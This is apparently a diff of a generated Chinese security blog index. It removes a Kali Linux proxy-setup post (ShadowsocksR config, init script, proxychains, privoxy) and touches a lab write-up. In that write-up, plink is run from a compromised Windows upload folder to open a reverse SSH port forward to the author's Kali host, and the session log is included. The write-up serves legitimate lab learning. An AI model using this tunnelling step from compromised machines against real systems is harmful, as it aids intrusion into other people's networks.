-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;server&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,   //服务器IP地址</span><br><span class="line">        <span class="string">&quot;server_ipv6&quot;</span>: <span class="string">&quot;::&quot;</span>,</span><br><span class="line">        <span class="string">&quot;server_port&quot;</span>: 2333,  //端口</span><br><span class="line">        <span class="string">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, </span><br><span class="line">        <span class="string">&quot;local_port&quot;</span>: 1080,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,  //密码</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;aes-256-cfb&quot;</span>, //加密方式</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_aes128_md5&quot;</span>, //协议</span><br><span class="line">        <span class="string">&quot;protocol_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //协议参数</span><br><span class="line">        <span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;plain&quot;</span>,  //混淆</span><br><span class="line">        <span class="string">&quot;obfs_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //混淆参数</span><br><span class="line">        <span class="string">&quot;speed_limit_per_con&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;speed_limit_per_user&quot;</span>: 0,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;additional_ports&quot;</span> : &#123;&#125;, </span><br><span class="line">        <span class="string">&quot;additional_ports_only&quot;</span> : <span class="literal">false</span>, </span><br><span class="line">        <span class="string">&quot;timeout&quot;</span>: 120,</span><br><span class="line">        <span class="string">&quot;udp_timeout&quot;</span>: 60,</span><br><span class="line">        <span class="string">&quot;dns_ipv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;connect_verbose_info&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a><strong>配置代理</strong></h3><ul>
-<li>以Firefox为例，Chrome上设置类似。</li>
-<li>在应用商店找到插件 <code>Proxy SwitchyOmega</code>，添加至Chrome</li>
-<li>点击 图标 &gt;&gt; 选项 &gt;&gt; (左边)新建情景模式 ,选第一项 <code>代理服务器</code></li>
-</ul>
-<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814192051948.png" class>
-
-<h3 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a><strong>设置开机启动</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch ssr</span><br><span class="line">chmod +x ssr</span><br><span class="line">vim ssr</span><br></pre></td></tr></table></figure>
-
-<p>其中ssr的内容为</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: ssr    // 程序名，唯一。</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: ssr    // 启动项的简短说明，随心写。</span></span><br><span class="line"><span class="comment"># Description: shadowsocksR    // 启动项的完整说明，随心写。</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">nohup ssr start &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
-
-<p>设置为开机自启</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d ssr defaults</span><br></pre></td></tr></table></figure>
-
-<p>删除开机启动</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d -f ssr remove</span><br></pre></td></tr></table></figure>
-
-<p>开机手动开启或关闭</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssr start</span><br><span class="line">ssr stop</span><br><span class="line">ssr uninstall  //卸载</span><br></pre></td></tr></table></figure>
-
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a><strong>测试</strong></h3><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814193445301.png" class>
-
-
-<h2 id="终端命令行代理"><a href="#终端命令行代理" class="headerlink" title="终端命令行代理"></a>终端命令行代理</h2><h3 id="使用proxychains"><a href="#使用proxychains" class="headerlink" title="使用proxychains"></a>使用proxychains</h3><p><code>proxychains</code>终端命令行代理神器，科学上网，内网穿透渗透必备</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
-
-<p>编辑配置文件，某尾修改自己的socks5本地代理地址很端口。</p>
-<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195018483.png" class>
-
-<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains curl https://www.google.com</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195221075.png" class>
-
-<h3 id="使用privoxy"><a href="#使用privoxy" class="headerlink" title="使用privoxy"></a>使用privoxy</h3><p>使用Privoxy实现，此方法只有临时生效</p>
-<p>首先安装privoxy</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y privoxy</span><br></pre></td></tr></table></figure>
-
-<p>本次使用全局模式。全局模式，将所有http/https请求走代理服务。</p>
-<p>1.添加本地ssr服务到配置文件</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;forward-socks5 / 127.0.0.1:1080 .&#x27;</span> &gt;&gt; /etc/privoxy/config</span><br></pre></td></tr></table></figure>
-
-<p>2.Privoxy 默认监听端口是是8118，每次使用都需要添加如下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> no_proxy=localhost</span><br></pre></td></tr></table></figure>
-
-<p>3.启动服务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start privoxy.service</span><br><span class="line">systemctl <span class="built_in">enable</span> privoxy.service</span><br></pre></td></tr></table></figure>
-
-<p>no_proxy是不经过privoxy代理的地址<br>只能填写具体的ip、域名后缀，多个条目之间使用’,’逗号隔开<br>比如: export no_proxy=”localhost, 192.168.1.1, ip.cn, chinaz.com”<br>访问 localhost、192.168.1.1、ip.cn、*.ip.cn、chinaz.com、*.chinaz.com 将不使用代理</p>
-</blockquote>
-<p>查看出口配置</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140327118.png" class>
-
-<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>出现网页源码则为成功</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sL facebook.com</span><br><span class="line">curl -sL www.baidu.com</span><br><span class="line">curl -sL www.google.com</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140200323.png" class>
-
-
-
-]]></content>
-      <categories>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1287,7 +1349,7 @@
 <blockquote>
 <p>报错为：无法同意密钥交换算法</p>
 <p>Google一下发现需要更新putty，但是更新后还是不好使。。。菜狗一脸茫然！</p>
-<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjeDc0OyYjeDQwOyYjNDk7JiN4MzA7JiM0NjsmI3gzMTsmIzQ4OyYjNDY7JiN4MzE7JiN4Mzc7JiN4MmU7JiM1MDsmIzQ5OyYjeDM2Ow==">&#114;&#111;&#111;&#x74;&#x40;&#49;&#x30;&#46;&#x31;&#48;&#46;&#x31;&#x37;&#x2e;&#50;&#49;&#x36;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjeDc0OyYjNjQ7JiM0OTsmI3gzMDsmI3gyZTsmIzQ5OyYjeDMwOyYjNDY7JiM0OTsmIzU1OyYjNDY7JiN4MzI7JiN4MzE7JiM1NDs=">&#114;&#111;&#111;&#x74;&#64;&#49;&#x30;&#x2e;&#49;&#x30;&#46;&#49;&#55;&#46;&#x32;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiN4NzY7JiN4NjU7JiM1MDsmI3gzNTsmIzUzOyYjeDMxOyYjNTc7JiN4MmQ7JiN4NzM7JiN4Njg7JiN4NjE7JiN4MzI7JiN4MzU7JiN4MzY7JiM2NDsmIzEwODsmI3g2OTsmIzk4OyYjMTE1OyYjMTE1OyYjeDY4OyYjeDJlOyYjeDZmOyYjMTE0OyYjeDY3Ow==">&#99;&#x75;&#114;&#x76;&#x65;&#50;&#x35;&#53;&#x31;&#57;&#x2d;&#x73;&#x68;&#x61;&#x32;&#x35;&#x36;&#64;&#108;&#x69;&#98;&#115;&#115;&#x68;&#x2e;&#x6f;&#114;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiMxMTg7JiN4NjU7JiM1MDsmIzUzOyYjeDM1OyYjNDk7JiM1NzsmI3gyZDsmIzExNTsmI3g2ODsmI3g2MTsmIzUwOyYjeDM1OyYjNTQ7JiN4NDA7JiMxMDg7JiN4Njk7JiN4NjI7JiN4NzM7JiN4NzM7JiN4Njg7JiN4MmU7JiMxMTE7JiMxMTQ7JiN4Njc7">&#99;&#x75;&#114;&#118;&#x65;&#50;&#53;&#x35;&#49;&#57;&#x2d;&#115;&#x68;&#x61;&#50;&#x35;&#54;&#x40;&#108;&#x69;&#x62;&#x73;&#x73;&#x68;&#x2e;&#111;&#114;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
+<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjeDc0OyYjNjQ7JiM0OTsmIzQ4OyYjNDY7JiN4MzE7JiN4MzA7JiM0NjsmIzQ5OyYjNTU7JiN4MmU7JiM1MDsmIzQ5OyYjNTQ7">&#114;&#111;&#111;&#x74;&#64;&#49;&#48;&#46;&#x31;&#x30;&#46;&#49;&#55;&#x2e;&#50;&#49;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjeDZmOyYjMTExOyYjeDc0OyYjNjQ7JiM0OTsmI3gzMDsmI3gyZTsmIzQ5OyYjNDg7JiN4MmU7JiM0OTsmI3gzNzsmI3gyZTsmIzUwOyYjeDMxOyYjNTQ7">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x30;&#x2e;&#49;&#48;&#x2e;&#49;&#x37;&#x2e;&#50;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjeDc1OyYjeDcyOyYjMTE4OyYjeDY1OyYjNTA7JiN4MzU7JiN4MzU7JiN4MzE7JiN4Mzk7JiM0NTsmIzExNTsmI3g2ODsmIzk3OyYjNTA7JiM1MzsmIzU0OyYjeDQwOyYjeDZjOyYjeDY5OyYjOTg7JiMxMTU7JiN4NzM7JiN4Njg7JiN4MmU7JiMxMTE7JiN4NzI7JiMxMDM7">&#x63;&#x75;&#x72;&#118;&#x65;&#50;&#x35;&#x35;&#x31;&#x39;&#45;&#115;&#x68;&#97;&#50;&#53;&#54;&#x40;&#x6c;&#x69;&#98;&#115;&#x73;&#x68;&#x2e;&#111;&#x72;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTE3OyYjeDcyOyYjMTE4OyYjMTAxOyYjeDMyOyYjeDM1OyYjeDM1OyYjeDMxOyYjeDM5OyYjNDU7JiN4NzM7JiMxMDQ7JiM5NzsmIzUwOyYjeDM1OyYjeDM2OyYjeDQwOyYjMTA4OyYjMTA1OyYjeDYyOyYjeDczOyYjeDczOyYjeDY4OyYjNDY7JiN4NmY7JiMxMTQ7JiMxMDM7">&#x63;&#117;&#x72;&#118;&#101;&#x32;&#x35;&#x35;&#x31;&#x39;&#45;&#x73;&#104;&#97;&#50;&#x35;&#x36;&#x40;&#108;&#105;&#x62;&#x73;&#x73;&#x68;&#46;&#x6f;&#114;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
 </blockquote>
 <p><code>第二天我又来了，这回成功了！，这回换成了powershell。</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure>
